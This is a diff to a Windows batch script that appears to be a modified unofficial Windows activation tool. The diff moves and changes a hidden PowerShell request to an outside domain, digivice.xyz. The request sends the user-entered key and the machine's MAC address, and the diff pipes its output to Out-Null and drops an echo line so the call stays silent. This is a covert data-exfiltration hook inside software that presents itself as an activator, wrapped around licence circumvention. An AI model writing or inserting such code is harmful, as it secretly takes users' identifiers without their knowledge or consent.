@@ -979,10 +979,9 @@ call :dk_checkperm
 if defined _perm (
 
 
-:: i modified here
+:: i modified here | activation successful
 :: hit url to update scripting status
-echo %userInput%
-powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=windows&status=complete&key=!userInput!')"
+powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=windows&status=complete&key=!userInput!&mac=!userMacAdd!' -UseBasicParsing) | Out-Null"
 
 
 echo:
@@ -1060,12 +1059,6 @@ call :dk_color2 %Blue% "Check this page for help" %_Yellow% " %mas%licensing-ser
 
 echo:
 if defined _perm (
-
-:: i modified here
-:: hit url to update scripting status
-powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=windows&status=complete&key=!userInput!&mac=!userMacAdd!' -UseBasicParsing) | Out-Null"
-
-
 call :dk_color %Green% "%winos% is permanently activated with a digital license."
 ) else (
 call :dk_color %Red% "Activation Failed %error_code%"
